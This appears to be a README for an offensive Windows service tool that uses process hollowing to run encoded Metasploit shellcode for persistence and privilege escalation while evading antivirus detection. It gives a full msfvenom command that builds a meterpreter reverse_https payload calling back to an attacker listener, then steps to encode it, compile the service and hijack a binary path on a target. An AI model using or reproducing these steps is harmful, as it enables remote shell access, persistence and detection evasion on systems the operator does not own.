
This program is a Windows Service with the process hollowing technique that runs shellcode , it requires the ROT "encrypted" shellcode that the user will create with the HollowCrypt program. 
I created this because there were moments where I needed a custom and easy way to run metasploit shellcode on a windows service to persist/privilege escalate, and using the common tools would trigger my binaries . . 


## How to use it

First, we need to create our shellcode:
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.147 LPORT=443 EXITFUNC=thread -f csharp
```

Then, edit the HollowCrypt source code , compile and execute:
```
HollowCrypt.exe
```

After that, replace the encrypted shellcode in the HollowSVC source code. 
Now  compile the service in the arch of your target, setup your listener, hijack the binary/path in the target and run!
